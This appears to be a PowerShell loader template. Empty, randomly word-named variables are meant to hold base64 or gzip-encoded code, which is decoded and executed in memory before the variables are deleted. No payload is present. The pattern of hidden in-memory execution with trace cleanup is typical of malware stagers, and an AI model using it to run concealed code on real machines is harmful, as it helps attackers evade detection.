#Requires -Version 2

$Wrinkliest = ""
$Nourishing = ""
$Effusively = ""
$Bulldozers = ""
$Afterwards = ""
$Throwaways = ""
$Ayatollahs = ""
$Guarantors = ""
$Interfered = ""
$Impaneling = ""
$Immemorial = ""
$Postmodern = ""
$Extendible = ""
$Haranguing = ""
$Unburdened = ""
$Polytheist = ""
$Alternator = ""
$Minimizing = ""
$Preexisted = ""
$Lunchrooms = ""
$Interfaced = ""
$Brigantine = ""
$Deductions = ""
$Squelching = ""
$Tidewaters = ""

$Modules = @($Wrinkliest,$Nourishing,$Effusively,$Bulldozers,$Afterwards,$Throwaways,$Ayatollahs,$Guarantors,$Interfered,$Impaneling,$Immemorial,$Postmodern,$Extendible,$Haranguing,$Unburdened,$Polytheist,$Alternator,$Minimizing,$Preexisted,$Lunchrooms,$Interfaced,$Brigantine,$Deductions,$Squelching,$Tidewaters)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Wrinkliest","Nourishing","Effusively","Bulldozers","Afterwards","Throwaways","Ayatollahs","Guarantors","Interfered","Impaneling","Immemorial","Postmodern","Extendible","Haranguing","Unburdened","Polytheist","Alternator","Minimizing","Preexisted","Lunchrooms","Interfaced","Brigantine","Deductions","Squelching","Tidewaters") | ForEach-Object { Remove-Variable -Name $_ }
